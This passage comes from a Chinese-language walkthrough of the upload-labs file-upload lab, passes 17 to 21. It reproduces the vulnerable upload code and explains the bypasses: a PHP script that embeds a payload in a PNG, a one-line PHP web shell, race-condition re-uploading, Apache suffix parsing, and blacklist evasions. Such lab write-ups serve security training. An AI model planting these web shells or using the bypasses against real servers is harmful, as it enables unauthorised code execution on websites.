+           <span style="color:#2aa198">0x5a</span>, <span style="color:#2aa198">0x01</span>, <span style="color:#2aa198">0xdc</span>, <span style="color:#2aa198">0x5a</span>, <span style="color:#2aa198">0x01</span>, <span style="color:#2aa198">0xdc</span>, <span style="color:#2aa198">0xa3</span>, <span style="color:#2aa198">0x9f</span>,
+           <span style="color:#2aa198">0x67</span>, <span style="color:#2aa198">0xa5</span>, <span style="color:#2aa198">0xbe</span>, <span style="color:#2aa198">0x5f</span>, <span style="color:#2aa198">0x76</span>, <span style="color:#2aa198">0x74</span>, <span style="color:#2aa198">0x5a</span>, <span style="color:#2aa198">0x4c</span>,
+           <span style="color:#2aa198">0xa1</span>, <span style="color:#2aa198">0x3f</span>, <span style="color:#2aa198">0x7a</span>, <span style="color:#2aa198">0xbf</span>, <span style="color:#2aa198">0x30</span>, <span style="color:#2aa198">0x6b</span>, <span style="color:#2aa198">0x88</span>, <span style="color:#2aa198">0x2d</span>,
+           <span style="color:#2aa198">0x60</span>, <span style="color:#2aa198">0x65</span>, <span style="color:#2aa198">0x7d</span>, <span style="color:#2aa198">0x52</span>, <span style="color:#2aa198">0x9d</span>, <span style="color:#2aa198">0xad</span>, <span style="color:#2aa198">0x88</span>, <span style="color:#2aa198">0xa1</span>,
+           <span style="color:#2aa198">0x66</span>, <span style="color:#2aa198">0x44</span>, <span style="color:#2aa198">0x50</span>, <span style="color:#2aa198">0x33</span>);
+
+
+
+<span style="color:#268bd2">$img</span> <span style="color:#719e07">=</span> imagecreatetruecolor(<span style="color:#2aa198">32</span>, <span style="color:#2aa198">32</span>);
+
+<span style="color:#719e07">for</span> (<span style="color:#268bd2">$y</span> <span style="color:#719e07">=</span> <span style="color:#2aa198">0</span>; <span style="color:#268bd2">$y</span> <span style="color:#719e07">&lt;</span> sizeof(<span style="color:#268bd2">$p</span>); <span style="color:#268bd2">$y</span> <span style="color:#719e07">+=</span> <span style="color:#2aa198">3</span>) {
+   <span style="color:#268bd2">$r</span> <span style="color:#719e07">=</span> <span style="color:#268bd2">$p</span>[<span style="color:#268bd2">$y</span>];
+   <span style="color:#268bd2">$g</span> <span style="color:#719e07">=</span> <span style="color:#268bd2">$p</span>[<span style="color:#268bd2">$y</span><span style="color:#719e07">+</span><span style="color:#2aa198">1</span>];
+   <span style="color:#268bd2">$b</span> <span style="color:#719e07">=</span> <span style="color:#268bd2">$p</span>[<span style="color:#268bd2">$y</span><span style="color:#719e07">+</span><span style="color:#2aa198">2</span>];
+   <span style="color:#268bd2">$color</span> <span style="color:#719e07">=</span> imagecolorallocate(<span style="color:#268bd2">$img</span>, <span style="color:#268bd2">$r</span>, <span style="color:#268bd2">$g</span>, <span style="color:#268bd2">$b</span>);
+   imagesetpixel(<span style="color:#268bd2">$img</span>, round(<span style="color:#268bd2">$y</span> <span style="color:#719e07">/</span> <span style="color:#2aa198">3</span>), <span style="color:#2aa198">0</span>, <span style="color:#268bd2">$color</span>);
+}
+
+imagepng(<span style="color:#268bd2">$img</span>,<span style="color:#2aa198">&#39;./1.png&#39;</span>);
+<span style="color:#719e07">?&gt;</span>
+</code></pre></div><p>运行后生成1.png,然后直接上传,在下载下来查看里面有啥内容</p>
+<p><img src="images/upload-labs-challenge/17-7.png" alt="17-7"></p>
+<p>可以看到里面有段php代码没有被删除</p>
+<div class="highlight"><pre style="color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#719e07">&lt;?=</span><span style="color:#268bd2">$_GET</span>[<span style="color:#2aa198">0</span>](<span style="color:#268bd2">$_POST</span>[<span style="color:#2aa198">1</span>]);<span style="color:#719e07">?&gt;</span>
+</code></pre></div><p><img src="images/upload-labs-challenge/17-6.png" alt="17-6"></p>
+<h3 id="pass-18">pass-18</h3>
+<div class="highlight"><pre style="color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#268bd2">$is_upload</span> <span style="color:#719e07">=</span> <span style="color:#719e07">false</span>;
+<span style="color:#268bd2">$msg</span> <span style="color:#719e07">=</span> <span style="color:#719e07">null</span>;
+
+<span style="color:#719e07">if</span>(isset(<span style="color:#268bd2">$_POST</span>[<span style="color:#2aa198">&#39;submit&#39;</span>])){
+    <span style="color:#268bd2">$ext_arr</span> <span style="color:#719e07">=</span> <span style="color:#719e07">array</span>(<span style="color:#2aa198">&#39;jpg&#39;</span>,<span style="color:#2aa198">&#39;png&#39;</span>,<span style="color:#2aa198">&#39;gif&#39;</span>);
+    <span style="color:#268bd2">$file_name</span> <span style="color:#719e07">=</span> <span style="color:#268bd2">$_FILES</span>[<span style="color:#2aa198">&#39;upload_file&#39;</span>][<span style="color:#2aa198">&#39;name&#39;</span>];
+    <span style="color:#268bd2">$temp_file</span> <span style="color:#719e07">=</span> <span style="color:#268bd2">$_FILES</span>[<span style="color:#2aa198">&#39;upload_file&#39;</span>][<span style="color:#2aa198">&#39;tmp_name&#39;</span>];
+    <span style="color:#268bd2">$file_ext</span> <span style="color:#719e07">=</span> substr(<span style="color:#268bd2">$file_name</span>,strrpos(<span style="color:#268bd2">$file_name</span>,<span style="color:#2aa198">&#34;.&#34;</span>)<span style="color:#719e07">+</span><span style="color:#2aa198">1</span>);
+    <span style="color:#268bd2">$upload_file</span> <span style="color:#719e07">=</span> UPLOAD_PATH <span style="color:#719e07">.</span> <span style="color:#2aa198">&#39;/&#39;</span> <span style="color:#719e07">.</span> <span style="color:#268bd2">$file_name</span>;
+
+    <span style="color:#719e07">if</span>(move_uploaded_file(<span style="color:#268bd2">$temp_file</span>, <span style="color:#268bd2">$upload_file</span>)){
+        <span style="color:#719e07">if</span>(in_array(<span style="color:#268bd2">$file_ext</span>,<span style="color:#268bd2">$ext_arr</span>)){
+             <span style="color:#268bd2">$img_path</span> <span style="color:#719e07">=</span> UPLOAD_PATH <span style="color:#719e07">.</span> <span style="color:#2aa198">&#39;/&#39;</span><span style="color:#719e07">.</span> rand(<span style="color:#2aa198">10</span>, <span style="color:#2aa198">99</span>)<span style="color:#719e07">.</span>date(<span style="color:#2aa198">&#34;YmdHis&#34;</span>)<span style="color:#719e07">.</span><span style="color:#2aa198">&#34;.&#34;</span><span style="color:#719e07">.</span><span style="color:#268bd2">$file_ext</span>;
+             rename(<span style="color:#268bd2">$upload_file</span>, <span style="color:#268bd2">$img_path</span>);
+             <span style="color:#268bd2">$is_upload</span> <span style="color:#719e07">=</span> <span style="color:#719e07">true</span>;
+        }<span style="color:#719e07">else</span>{
+            <span style="color:#268bd2">$msg</span> <span style="color:#719e07">=</span> <span style="color:#2aa198">&#34;只允许上传.jpg|.png|.gif类型文件！&#34;</span>;
+            unlink(<span style="color:#268bd2">$upload_file</span>);
+        }
+    }<span style="color:#719e07">else</span>{
+        <span style="color:#268bd2">$msg</span> <span style="color:#719e07">=</span> <span style="color:#2aa198">&#39;上传出错！&#39;</span>;
+    }
+}
+</code></pre></div><p>从代码就可以看出整个流程是这样的</p>
+<div class="highlight"><pre style="color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#2aa198">1.</span>上传文件
+<span style="color:#2aa198">2.</span>文件保存在上传目录中
+<span style="color:#2aa198">3.</span>判断文件是否在白名单内
+<span style="color:#2aa198">4.</span>是则重新给文件命名,不是则删除
+</code></pre></div><p>也就是说这里是能够上传php的,但是只是那么一瞬间,就会被删除</p>
+<p>所以这里可以使用条件竞争,通过burp不断的重发上传页面和shell页面</p>
+<p><img src="images/upload-labs-challenge/18-3.png" alt="18-3"></p>
+<p><img src="images/upload-labs-challenge/18-4.png" alt="18-2"></p>
+<p>直接给它整个无限重发就完事了 冲冲冲!</p>
+<p><img src="images/upload-labs-challenge/18-2.png" alt="18-2"></p>
+<p>当然最后还是会被删除,但是只要手快就没有做不到 :)</p>
+<p><img src="images/upload-labs-challenge/18-1.png" alt="18-1"></p>
+<p>当然可以将内容更改下,这样就会在同目录下生成个1.php的文件</p>
+<div class="highlight"><pre style="color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#719e07">&lt;?</span>php fputs(fopen(<span style="color:#2aa198">&#34;1.php&#34;</span>, <span style="color:#2aa198">&#34;w&#34;</span>), <span style="color:#2aa198">&#34;&lt;?php phpinfo(); ?&gt;&#34;</span>); <span style="color:#719e07">?&gt;</span>
+</code></pre></div><h3 id="pass-19">pass-19</h3>
+<div class="highlight"><pre style="color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#586e75">//index.php
+</span><span style="color:#586e75"></span><span style="color:#268bd2">$is_upload</span> <span style="color:#719e07">=</span> <span style="color:#719e07">false</span>;
+<span style="color:#268bd2">$msg</span> <span style="color:#719e07">=</span> <span style="color:#719e07">null</span>;
+<span style="color:#719e07">if</span> (isset(<span style="color:#268bd2">$_POST</span>[<span style="color:#2aa198">&#39;submit&#39;</span>]))
+{
+    <span style="color:#719e07">require_once</span>(<span style="color:#2aa198">&#34;./myupload.php&#34;</span>);
+    <span style="color:#268bd2">$imgFileName</span> <span style="color:#719e07">=</span>time();
+    <span style="color:#268bd2">$u</span> <span style="color:#719e07">=</span> <span style="color:#719e07">new</span> MyUpload(<span style="color:#268bd2">$_FILES</span>[<span style="color:#2aa198">&#39;upload_file&#39;</span>][<span style="color:#2aa198">&#39;name&#39;</span>], <span style="color:#268bd2">$_FILES</span>[<span style="color:#2aa198">&#39;upload_file&#39;</span>][<span style="color:#2aa198">&#39;tmp_name&#39;</span>], <span style="color:#268bd2">$_FILES</span>[<span style="color:#2aa198">&#39;upload_file&#39;</span>][<span style="color:#2aa198">&#39;size&#39;</span>],<span style="color:#268bd2">$imgFileName</span>);
+    <span style="color:#268bd2">$status_code</span> <span style="color:#719e07">=</span> <span style="color:#268bd2">$u</span><span style="color:#719e07">-&gt;</span>upload(UPLOAD_PATH);
+    <span style="color:#719e07">switch</span> (<span style="color:#268bd2">$status_code</span>) {
+        <span style="color:#719e07">case</span> <span style="color:#2aa198">1</span><span style="color:#719e07">:</span>
+            <span style="color:#268bd2">$is_upload</span> <span style="color:#719e07">=</span> <span style="color:#719e07">true</span>;
+            <span style="color:#268bd2">$img_path</span> <span style="color:#719e07">=</span> <span style="color:#268bd2">$u</span><span style="color:#719e07">-&gt;</span>cls_upload_dir <span style="color:#719e07">.</span> <span style="color:#268bd2">$u</span><span style="color:#719e07">-&gt;</span>cls_file_rename_to;
+            <span style="color:#719e07">break</span>;
+        <span style="color:#719e07">case</span> <span style="color:#2aa198">2</span><span style="color:#719e07">:</span>
+            <span style="color:#268bd2">$msg</span> <span style="color:#719e07">=</span> <span style="color:#2aa198">&#39;文件已经被上传，但没有重命名。&#39;</span>;
+            <span style="color:#719e07">break</span>; 
+        <span style="color:#719e07">case</span> <span style="color:#719e07">-</span><span style="color:#2aa198">1</span><span style="color:#719e07">:</span>
+            <span style="color:#268bd2">$msg</span> <span style="color:#719e07">=</span> <span style="color:#2aa198">&#39;这个文件不能上传到服务器的临时文件存储目录。&#39;</span>;
+            <span style="color:#719e07">break</span>; 
+        <span style="color:#719e07">case</span> <span style="color:#719e07">-</span><span style="color:#2aa198">2</span><span style="color:#719e07">:</span>
+            <span style="color:#268bd2">$msg</span> <span style="color:#719e07">=</span> <span style="color:#2aa198">&#39;上传失败，上传目录不可写。&#39;</span>;
+            <span style="color:#719e07">break</span>; 
+        <span style="color:#719e07">case</span> <span style="color:#719e07">-</span><span style="color:#2aa198">3</span><span style="color:#719e07">:</span>
+            <span style="color:#268bd2">$msg</span> <span style="color:#719e07">=</span> <span style="color:#2aa198">&#39;上传失败，无法上传该类型文件。&#39;</span>;
+            <span style="color:#719e07">break</span>; 
+        <span style="color:#719e07">case</span> <span style="color:#719e07">-</span><span style="color:#2aa198">4</span><span style="color:#719e07">:</span>
+            <span style="color:#268bd2">$msg</span> <span style="color:#719e07">=</span> <span style="color:#2aa198">&#39;上传失败，上传的文件过大。&#39;</span>;
+            <span style="color:#719e07">break</span>; 
+        <span style="color:#719e07">case</span> <span style="color:#719e07">-</span><span style="color:#2aa198">5</span><span style="color:#719e07">:</span>
+            <span style="color:#268bd2">$msg</span> <span style="color:#719e07">=</span> <span style="color:#2aa198">&#39;上传失败，服务器已经存在相同名称文件。&#39;</span>;
+            <span style="color:#719e07">break</span>; 
+        <span style="color:#719e07">case</span> <span style="color:#719e07">-</span><span style="color:#2aa198">6</span><span style="color:#719e07">:</span>
+            <span style="color:#268bd2">$msg</span> <span style="color:#719e07">=</span> <span style="color:#2aa198">&#39;文件无法上传，文件不能复制到目标目录。&#39;</span>;
+            <span style="color:#719e07">break</span>;      
+        <span style="color:#719e07">default</span><span style="color:#719e07">:</span>
+            <span style="color:#268bd2">$msg</span> <span style="color:#719e07">=</span> <span style="color:#2aa198">&#39;未知错误！&#39;</span>;
+            <span style="color:#719e07">break</span>;
+    }
+}
+
+<span style="color:#586e75">//myupload.php
+</span><span style="color:#586e75"></span><span style="color:#719e07">class</span> <span style="color:#268bd2">MyUpload</span>{
+<span style="color:#719e07">......</span>
+<span style="color:#719e07">......</span>
+<span style="color:#719e07">......</span> 
+  <span style="color:#719e07">var</span> <span style="color:#268bd2">$cls_arr_ext_accepted</span> <span style="color:#719e07">=</span> <span style="color:#719e07">array</span>(
+      <span style="color:#2aa198">&#34;.doc&#34;</span>, <span style="color:#2aa198">&#34;.xls&#34;</span>, <span style="color:#2aa198">&#34;.txt&#34;</span>, <span style="color:#2aa198">&#34;.pdf&#34;</span>, <span style="color:#2aa198">&#34;.gif&#34;</span>, <span style="color:#2aa198">&#34;.jpg&#34;</span>, <span style="color:#2aa198">&#34;.zip&#34;</span>, <span style="color:#2aa198">&#34;.rar&#34;</span>, <span style="color:#2aa198">&#34;.7z&#34;</span>,<span style="color:#2aa198">&#34;.ppt&#34;</span>,
+      <span style="color:#2aa198">&#34;.html&#34;</span>, <span style="color:#2aa198">&#34;.xml&#34;</span>, <span style="color:#2aa198">&#34;.tiff&#34;</span>, <span style="color:#2aa198">&#34;.jpeg&#34;</span>, <span style="color:#2aa198">&#34;.png&#34;</span> );
+
+<span style="color:#719e07">......</span>
+<span style="color:#719e07">......</span>
+<span style="color:#719e07">......</span>  
+  <span style="color:#2aa198">/** upload()
+</span><span style="color:#2aa198">   **
+</span><span style="color:#2aa198">   ** Method to upload the file.
+</span><span style="color:#2aa198">   ** This is the only method to call outside the class.
+</span><span style="color:#2aa198">   ** @para String name of directory we upload to
+</span><span style="color:#2aa198">   ** @returns void
+</span><span style="color:#2aa198">  **/</span>
+  <span style="color:#719e07">function</span> <span style="color:#268bd2">upload</span>( <span style="color:#268bd2">$dir</span> ){
+    
+    <span style="color:#268bd2">$ret</span> <span style="color:#719e07">=</span> <span style="color:#268bd2">$this</span><span style="color:#719e07">-&gt;</span>isUploadedFile();
+    
+    <span style="color:#719e07">if</span>( <span style="color:#268bd2">$ret</span> <span style="color:#719e07">!=</span> <span style="color:#2aa198">1</span> ){
+      <span style="color:#719e07">return</span> <span style="color:#268bd2">$this</span><span style="color:#719e07">-&gt;</span>resultUpload( <span style="color:#268bd2">$ret</span> );
+    }
+
+    <span style="color:#268bd2">$ret</span> <span style="color:#719e07">=</span> <span style="color:#268bd2">$this</span><span style="color:#719e07">-&gt;</span>setDir( <span style="color:#268bd2">$dir</span> );
+    <span style="color:#719e07">if</span>( <span style="color:#268bd2">$ret</span> <span style="color:#719e07">!=</span> <span style="color:#2aa198">1</span> ){
+      <span style="color:#719e07">return</span> <span style="color:#268bd2">$this</span><span style="color:#719e07">-&gt;</span>resultUpload( <span style="color:#268bd2">$ret</span> );
+    }
+
+    <span style="color:#268bd2">$ret</span> <span style="color:#719e07">=</span> <span style="color:#268bd2">$this</span><span style="color:#719e07">-&gt;</span>checkExtension();
+    <span style="color:#719e07">if</span>( <span style="color:#268bd2">$ret</span> <span style="color:#719e07">!=</span> <span style="color:#2aa198">1</span> ){
+      <span style="color:#719e07">return</span> <span style="color:#268bd2">$this</span><span style="color:#719e07">-&gt;</span>resultUpload( <span style="color:#268bd2">$ret</span> );
+    }
+
+    <span style="color:#268bd2">$ret</span> <span style="color:#719e07">=</span> <span style="color:#268bd2">$this</span><span style="color:#719e07">-&gt;</span>checkSize();
+    <span style="color:#719e07">if</span>( <span style="color:#268bd2">$ret</span> <span style="color:#719e07">!=</span> <span style="color:#2aa198">1</span> ){
+      <span style="color:#719e07">return</span> <span style="color:#268bd2">$this</span><span style="color:#719e07">-&gt;</span>resultUpload( <span style="color:#268bd2">$ret</span> );    
+    }
+    
+    <span style="color:#586e75">// if flag to check if the file exists is set to 1
+</span><span style="color:#586e75"></span>    
+    <span style="color:#719e07">if</span>( <span style="color:#268bd2">$this</span><span style="color:#719e07">-&gt;</span>cls_file_exists <span style="color:#719e07">==</span> <span style="color:#2aa198">1</span> ){
+      
+      <span style="color:#268bd2">$ret</span> <span style="color:#719e07">=</span> <span style="color:#268bd2">$this</span><span style="color:#719e07">-&gt;</span>checkFileExists();
+      <span style="color:#719e07">if</span>( <span style="color:#268bd2">$ret</span> <span style="color:#719e07">!=</span> <span style="color:#2aa198">1</span> ){
+        <span style="color:#719e07">return</span> <span style="color:#268bd2">$this</span><span style="color:#719e07">-&gt;</span>resultUpload( <span style="color:#268bd2">$ret</span> );    
+      }
+    }
+
+    <span style="color:#586e75">// if we are here, we are ready to move the file to destination
+</span><span style="color:#586e75"></span>
+    <span style="color:#268bd2">$ret</span> <span style="color:#719e07">=</span> <span style="color:#268bd2">$this</span><span style="color:#719e07">-&gt;</span>move();
+    <span style="color:#719e07">if</span>( <span style="color:#268bd2">$ret</span> <span style="color:#719e07">!=</span> <span style="color:#2aa198">1</span> ){
+      <span style="color:#719e07">return</span> <span style="color:#268bd2">$this</span><span style="color:#719e07">-&gt;</span>resultUpload( <span style="color:#268bd2">$ret</span> );    
+    }
+
+    <span style="color:#586e75">// check if we need to rename the file
+</span><span style="color:#586e75"></span>
+    <span style="color:#719e07">if</span>( <span style="color:#268bd2">$this</span><span style="color:#719e07">-&gt;</span>cls_rename_file <span style="color:#719e07">==</span> <span style="color:#2aa198">1</span> ){
+      <span style="color:#268bd2">$ret</span> <span style="color:#719e07">=</span> <span style="color:#268bd2">$this</span><span style="color:#719e07">-&gt;</span>renameFile();
+      <span style="color:#719e07">if</span>( <span style="color:#268bd2">$ret</span> <span style="color:#719e07">!=</span> <span style="color:#2aa198">1</span> ){
+        <span style="color:#719e07">return</span> <span style="color:#268bd2">$this</span><span style="color:#719e07">-&gt;</span>resultUpload( <span style="color:#268bd2">$ret</span> );    
+      }
+    }
+    
+    <span style="color:#586e75">// if we are here, everything worked as planned :)
+</span><span style="color:#586e75"></span>
+    <span style="color:#719e07">return</span> <span style="color:#268bd2">$this</span><span style="color:#719e07">-&gt;</span>resultUpload( <span style="color:#2aa198">&#34;SUCCESS&#34;</span> );
+  
+  }
+<span style="color:#719e07">......</span>
+<span style="color:#719e07">......</span>
+<span style="color:#719e07">......</span> 
+};
+</code></pre></div><p>其实这一关是比较抽象的,有几种解法</p>
+<p>(区别其实就是一个被改名字,一个不被改名字)</p>
+<p>1.Apache解析漏洞+条件竞争</p>
+<p>看到白名单中可以上传.7z的文件,但是apache是不认识他的</p>
+<p>apache中遇到不认识的后缀会往前来执行,直到遇到认识的为止</p>
+<p>这里还是需要到条件竞争,burp不断上传<strong>test.php.7z</strong>和不断访问<strong>uploadtest.php.7z</strong>(只要我速度够快就没有什么能难道我)</p>
+<p>2.直接图片马</p>
+<p><img src="images/upload-labs-challenge/19-1.png" alt="19-1"></p>
+<h3 id="pass-20">pass-20</h3>
+<div class="highlight"><pre style="color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-PHP" data-lang="PHP"><span style="color:#719e07">if</span> (isset(<span style="color:#268bd2">$_POST</span>[<span style="color:#2aa198">&#39;submit&#39;</span>])) {
+    <span style="color:#719e07">if</span> (file_exists(UPLOAD_PATH)) {
+        <span style="color:#268bd2">$deny_ext</span> <span style="color:#719e07">=</span> <span style="color:#719e07">array</span>(<span style="color:#2aa198">&#34;php&#34;</span>,<span style="color:#2aa198">&#34;php5&#34;</span>,<span style="color:#2aa198">&#34;php4&#34;</span>,<span style="color:#2aa198">&#34;php3&#34;</span>,<span style="color:#2aa198">&#34;php2&#34;</span>,<span style="color:#2aa198">&#34;html&#34;</span>,<span style="color:#2aa198">&#34;htm&#34;</span>,<span style="color:#2aa198">&#34;phtml&#34;</span>,<span style="color:#2aa198">&#34;pht&#34;</span>,<span style="color:#2aa198">&#34;jsp&#34;</span>,<span style="color:#2aa198">&#34;jspa&#34;</span>,<span style="color:#2aa198">&#34;jspx&#34;</span>,<span style="color:#2aa198">&#34;jsw&#34;</span>,<span style="color:#2aa198">&#34;jsv&#34;</span>,<span style="color:#2aa198">&#34;jspf&#34;</span>,<span style="color:#2aa198">&#34;jtml&#34;</span>,<span style="color:#2aa198">&#34;asp&#34;</span>,<span style="color:#2aa198">&#34;aspx&#34;</span>,<span style="color:#2aa198">&#34;asa&#34;</span>,<span style="color:#2aa198">&#34;asax&#34;</span>,<span style="color:#2aa198">&#34;ascx&#34;</span>,<span style="color:#2aa198">&#34;ashx&#34;</span>,<span style="color:#2aa198">&#34;asmx&#34;</span>,<span style="color:#2aa198">&#34;cer&#34;</span>,<span style="color:#2aa198">&#34;swf&#34;</span>,<span style="color:#2aa198">&#34;htaccess&#34;</span>);
+
+        <span style="color:#268bd2">$file_name</span> <span style="color:#719e07">=</span> <span style="color:#268bd2">$_POST</span>[<span style="color:#2aa198">&#39;save_name&#39;</span>];
+        <span style="color:#268bd2">$file_ext</span> <span style="color:#719e07">=</span> pathinfo(<span style="color:#268bd2">$file_name</span>,PATHINFO_EXTENSION);
+
+        <span style="color:#719e07">if</span>(<span style="color:#719e07">!</span>in_array(<span style="color:#268bd2">$file_ext</span>,<span style="color:#268bd2">$deny_ext</span>)) {
+            <span style="color:#268bd2">$temp_file</span> <span style="color:#719e07">=</span> <span style="color:#268bd2">$_FILES</span>[<span style="color:#2aa198">&#39;upload_file&#39;</span>][<span style="color:#2aa198">&#39;tmp_name&#39;</span>];
+            <span style="color:#268bd2">$img_path</span> <span style="color:#719e07">=</span> UPLOAD_PATH <span style="color:#719e07">.</span> <span style="color:#2aa198">&#39;/&#39;</span> <span style="color:#719e07">.</span><span style="color:#268bd2">$file_name</span>;
+            <span style="color:#719e07">if</span> (move_uploaded_file(<span style="color:#268bd2">$temp_file</span>, <span style="color:#268bd2">$img_path</span>)) { 
+                <span style="color:#268bd2">$is_upload</span> <span style="color:#719e07">=</span> <span style="color:#719e07">true</span>;
+            }<span style="color:#719e07">else</span>{
+                <span style="color:#268bd2">$msg</span> <span style="color:#719e07">=</span> <span style="color:#2aa198">&#39;上传出错！&#39;</span>;
+            }
+        }<span style="color:#719e07">else</span>{
+            <span style="color:#268bd2">$msg</span> <span style="color:#719e07">=</span> <span style="color:#2aa198">&#39;禁止保存为该类型文件！&#39;</span>;
+        }
+
+    }
+</code></pre></div><p>这一关才用了黑名单,从代码来看是可以有很多种方式的,所以个人感觉这关的意义不是很大</p>
+<p>因为上传目录可控,所以很多方法就可以实现</p>
+<div class="highlight"><pre style="color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#2aa198">1.</span>点绕过,php<span style="color:#719e07">.</span>没有出现在黑名单中,所以可以可以保存在1<span style="color:#719e07">.</span>php<span style="color:#719e07">.</span>
+<span style="color:#2aa198">2.</span><span style="color:#719e07">.</span>user<span style="color:#719e07">.</span>ini,ini也没有出现在黑名单中,所以同样可以bypass
+<span style="color:#2aa198">3.</span>大小写绕过
+<span style="color:#2aa198">4.00</span>截断
+<span style="color:#2aa198">5.</span>空格
+<span style="color:#719e07">...</span>
+<span style="color:#719e07">...</span>
+</code></pre></div><h3 id="pass-21">pass-21</h3>
+<div class="highlight"><pre style="color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#719e07">if</span>(<span style="color:#719e07">!</span><span style="color:#719e07">empty</span>(<span style="color:#268bd2">$_FILES</span>[<span style="color:#2aa198">&#39;upload_file&#39;</span>])){
+    <span style="color:#586e75">//检查MIME
+</span><span style="color:#586e75"></span>    <span style="color:#268bd2">$allow_type</span> <span style="color:#719e07">=</span> <span style="color:#719e07">array</span>(<span style="color:#2aa198">&#39;image/jpeg&#39;</span>,<span style="color:#2aa198">&#39;image/png&#39;</span>,<span style="color:#2aa198">&#39;image/gif&#39;</span>);
+    <span style="color:#719e07">if</span>(<span style="color:#719e07">!</span>in_array(<span style="color:#268bd2">$_FILES</span>[<span style="color:#2aa198">&#39;upload_file&#39;</span>][<span style="color:#2aa198">&#39;type&#39;</span>],<span style="color:#268bd2">$allow_type</span>)){
+        <span style="color:#268bd2">$msg</span> <span style="color:#719e07">=</span> <span style="color:#2aa198">&#34;禁止上传该类型文件!&#34;</span>;
+    }<span style="color:#719e07">else</span>{
+        <span style="color:#586e75">//检查文件名
+</span><span style="color:#586e75"></span>        <span style="color:#268bd2">$file</span> <span style="color:#719e07">=</span> <span style="color:#719e07">empty</span>(<span style="color:#268bd2">$_POST</span>[<span style="color:#2aa198">&#39;save_name&#39;</span>]) <span style="color:#719e07">?</span> <span style="color:#268bd2">$_FILES</span>[<span style="color:#2aa198">&#39;upload_file&#39;</span>][<span style="color:#2aa198">&#39;name&#39;</span>] <span style="color:#719e07">:</span> <span style="color:#268bd2">$_POST</span>[<span style="color:#2aa198">&#39;save_name&#39;</span>];
+        <span style="color:#719e07">if</span> (<span style="color:#719e07">!</span>is_array(<span style="color:#268bd2">$file</span>)) {
+            <span style="color:#268bd2">$file</span> <span style="color:#719e07">=</span> explode(<span style="color:#2aa198">&#39;.&#39;</span>, strtolower(<span style="color:#268bd2">$file</span>));
+        }
+
+        <span style="color:#268bd2">$ext</span> <span style="color:#719e07">=</span> end(<span style="color:#268bd2">$file</span>);
+        <span style="color:#268bd2">$allow_suffix</span> <span style="color:#719e07">=</span> <span style="color:#719e07">array</span>(<span style="color:#2aa198">&#39;jpg&#39;</span>,<span style="color:#2aa198">&#39;png&#39;</span>,<span style="color:#2aa198">&#39;gif&#39;</span>);
+        <span style="color:#719e07">if</span> (<span style="color:#719e07">!</span>in_array(<span style="color:#268bd2">$ext</span>, <span style="color:#268bd2">$allow_suffix</span>)) {
+            <span style="color:#268bd2">$msg</span> <span style="color:#719e07">=</span> <span style="color:#2aa198">&#34;禁止上传该后缀文件!&#34;</span>;
+        }<span style="color:#719e07">else</span>{
+            <span style="color:#268bd2">$file_name</span> <span style="color:#719e07">=</span> reset(<span style="color:#268bd2">$file</span>) <span style="color:#719e07">.</span> <span style="color:#2aa198">&#39;.&#39;</span> <span style="color:#719e07">.</span> <span style="color:#268bd2">$file</span>[count(<span style="color:#268bd2">$file</span>) <span style="color:#719e07">-</span> <span style="color:#2aa198">1</span>];
+            <span style="color:#268bd2">$temp_file</span> <span style="color:#719e07">=</span> <span style="color:#268bd2">$_FILES</span>[<span style="color:#2aa198">&#39;upload_file&#39;</span>][<span style="color:#2aa198">&#39;tmp_name&#39;</span>];
+            <span style="color:#268bd2">$img_path</span> <span style="color:#719e07">=</span> UPLOAD_PATH <span style="color:#719e07">.</span> <span style="color:#2aa198">&#39;/&#39;</span> <span style="color:#719e07">.</span><span style="color:#268bd2">$file_name</span>;
+            <span style="color:#719e07">if</span> (move_uploaded_file(<span style="color:#268bd2">$temp_file</span>, <span style="color:#268bd2">$img_path</span>)) {
+                <span style="color:#268bd2">$msg</span> <span style="color:#719e07">=</span> <span style="color:#2aa198">&#34;文件上传成功！&#34;</span>;
+                <span style="color:#268bd2">$is_upload</span> <span style="color:#719e07">=</span> <span style="color:#719e07">true</span>;
+            } <span style="color:#719e07">else</span> {
+                <span style="color:#268bd2">$msg</span> <span style="color:#719e07">=</span> <span style="color:#2aa198">&#34;文件上传失败！&#34;</span>;
+            }
+        }
+    }
+}
+</code></pre></div><p>这关看提示就知道,不简单,这种情况讲道理一般不会出现在生产环境中</p>
+<div class="highlight"><pre style="color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#2aa198">1.</span>检测MIME是否是<span style="color:#2aa198">&#39;image/jpeg&#39;</span>,<span style="color:#2aa198">&#39;image/png&#39;</span>,<span style="color:#2aa198">&#39;image/gif&#39;</span>,所以随便加个这里的头,或者图片马就可以下一步
+<span style="color:#2aa198">2.</span><span style="color:#719e07">!</span>is_array(<span style="color:#268bd2">$file</span>)检测是否是数组,如果不是文件名将会以<span style="color:#719e07">.</span>号作为分隔作为数组,所以这里需要给save_name设置为数组,才可以进行下一步
+<span style="color:#2aa198">3.</span><span style="color:#268bd2">$ext</span> <span style="color:#719e07">=</span> end(<span style="color:#268bd2">$file</span>);取数组最后得值,且需要为<span style="color:#2aa198">&#39;jpg&#39;</span>,<span style="color:#2aa198">&#39;png&#39;</span>,<span style="color:#2aa198">&#39;gif&#39;</span>
